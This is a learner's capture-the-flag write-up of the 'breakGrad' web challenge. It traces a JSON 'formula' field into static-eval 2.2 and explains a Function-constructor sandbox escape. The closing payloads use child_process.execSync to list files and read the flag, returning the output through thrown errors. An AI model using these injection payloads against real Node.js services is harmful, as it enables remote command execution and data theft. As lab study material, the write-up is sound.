# breakGrad

The web application provided takes json data as input and then returns a result if you passed or failed. There doesn't seem to be any other api actions or directories that we can traverse. 

# dynamic analysis

I attempted to FUZZ api/FUZZ, because the POST request when fetching the grades for students uses /api/calculate. However, no other actions were returned from the fuzzing.

I also attempted to gobuster some directories and only found the usual static directory.

The application does not deny xml input explicitly, but it doesn't recognize the name value when it's provided.

After playing around with the input of the json file, I discovered that no matter what name is entered into the name field the same response and received... This is irregular as the application should only respond to valid names of the professor. 

I inserted another value into the json input and received an extensive error in the response about JSON.parse failing.


# static analysis

Since I wasn't able to solve the challenge with just dynamic analysis I decided to take a look at the files provided.

**Sink found** The sink is in helpers/StudentHelper.js and the **source** is formula in the JSON input.

# tracking the source to the sink

We know from our dynamic analysis that when we check for is the student passes we POST a json form to /api/calculate. So this is the **route** that we will take a look at first.

Inside /routes/index.js, we have the following code for /api/calculate:
```javascript
router.post('/api/calculate', (req, res) => {
    let student = req.body;

    if (student.name === undefined) {
        return res.send({
            error: 'Specify student name'
        })
    }

    let formula = student.formula || '[0.20 * assignment + 0.25 * exam + 0.25 * paper]';

    if (StudentHelper.isDumb(student.name) || !StudentHelper.hasPassed(student, formula)) {
        return res.send({
            'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
        });
    }
```
In the let statement we see that formula is used similar to name, so we now that that can be a value we pass with JSON. Two functions are called in the same lin, isDumb() and hasPassed(). Nows isDumb() just checks if the students name contains the string of either of the ta's. All we need to do is make this function evaluate to false and we can reach **hasPassed()**. So we just change the **name** value. If not then the logical || will short circuit and we won't get into hasPassed(), which is **where our sink resides**!

# hasPassed()

```javascript
const evaluate = require('static-eval');
const parse = require('esprima').parse;

hasPassed({ exam, paper, assignment }, formula) {
        let ast = parse(formula).body[0].expression;
        let weight = evaluate(ast, { exam, paper, assignment });
```

Now in this snippet is where our source leaks into the sink ***evaluate()***. evaluate is static-eval, which is similar to js's eval and is **NOT suitable for handling arbitrary untrusted user input**. Now I made it up to this point solo, but the rest I read about in a writeup for this lab as I could not figure out what to inject into **formula**.

# static-eval injection

The writeup I used is https://hilb3r7.github.io/walkthroughs/babybreakinggrad.html and I was quite impressed with the author. They really took time to explain the background of how the payload is formed and what it's doing exactly. So kudos, hilb3r7!

I hadn't been testing locally up until now, which Is a major overlook on my part. part of the learning process is testing on your machine and beinga able to see how both back and front end react to input. So since the files were provided I booted up the server on my own machine locally.

This writeup exposed me to checking the pushes and errors to github projects to view what was patched. By doing this you are tipped off as to what needed to be patched in previous versions and how to test it. Thats exactly what is inside the github repo for static-eval. Inside one of the pushes a dev includes runtime tests for version 2.3. And by checking the package.json file we see it's running 2.2.

One of the runtime tests provided is:

```javascript
(function myTag(y){return ''[!y?'__proto__':'constructor'][y]})('constructor')('console.log(process.env)')()
```

And in the writeup he changed it to:

```javascript
(function (y){return 'whatever'[y?'split':'length']['constructor']})(42)('console.log(process.env)')()
```
*These were testing for if access is still allowed to function constructors.*

Focusing on the first part **(function (y){return 'whatever'[y?'split':'length']['constructor']})**. The key ting to understand here is the difference between a function declaration and a function expression.

* here a function is expression is used. We know this because only expressions can be contained inside of grouping operators "(" and ")".

* function names are optional for expressions which is why we can remove myTag.

* expressions can be parts of assignment expressions, so when a variable is assigned to a function thats declared on the same line, that is a function exrpession.

Inside of the function expression, we have a **ternary** statement. Lets rewrite to a more verbose understandable manner:

```javascript
(function myTag(param) {
    var someString = 'whatever';
    var x;
    
    if (param) {
        x = someString['split'];
    } else {
        x = someString['length'];
    }
    
    return x['constructor'];
})
```
If the value we pass in as the param evaluates as Truthy we return the first part, if no we return the second.

Since I'm new to Javascript the bracket syntax was foreign to me as I'd only see it in arrays, but string objects access helper methods in this way or the traditional dot method.

```javascript
'whatever'.split.constructor

'whatever'['split']['constructor']
```

the **(42)** is passed into the function expression that we are creating. This causes the func to return the constructor of the function 'split' or any arbitrary func. And the constructor of a function is a **function object**. Static-eval does not like functions, they are dangerous, and allow someone to execute malicious code. The reason we were able to return it is the function expression isn't evaluated until runtime!, because the compiler doens't know what parameter is going to be passed. 

The function object is returned, which we then call the constructor on with ('console.log(process.env)'). Which returns a function that will log the process.ev which we then call with the final ().

Lets rewrite the entire payload to a more verbose manner:
```javascript
function myTag(param) {
    if (param) {
        return Function;
    } else {
        return Number;
    }
}

var aFunc = myTag(42); //var aFunc = Function;
var exploit = aFunc('console.log(process.env)'); //var exploit = new Function('cons...');
exploit();
```

We see that the function constructor is used to call the arbitrary code. If you aren't lost yet, well idk...

**Great!! Now we break shit.**

The payload we discussed does print the process.env to the console, but how are we going to get the output remotely?? **remember the extensive errors??** Thats right, we know that errors are received by the client, so we can throw an error with the output of a system command.

# executing system commands 
The standard way to execute system commands in node is with ExecSync() function fo child_process. like so:

``` javascript
const execSync = require('child_process').execSync;
```
However with this payload we cannot call it like this, because of our scope. We must call it directly from the proccess module:

```javascript
process.mainModule.require("child_process").execSync()
```

Now that we know how to execute system commands we can throw the output of said commands as errors to have them returned to the client.

```javascript
(function (x) { return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('ls').toString())\")}` })()

(function (x) { return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('cat flagrfGNw').toString())\")}` })()
```

After placing these payloads in the formula JSON data. This will cause the application to evaluate the sytem commands and throw them as errors back at the client.


# Takeaways

* js is very important to master if I wan't to be come a web app tester. I wasn't even familiar with the concept of function expressions and declarations.

* **RESEARCH**. I never considered checking the pushes in a github repo to see the patches made to previous versions. It seems so obvious now tho.

* I think I did great considering my knowledge gaps. I found the source and the sink and only needed assistance with the payload needed to receive output.

* I need to be patient and not worry about the next box. Take my time, set up a local environment for testing, and JETS
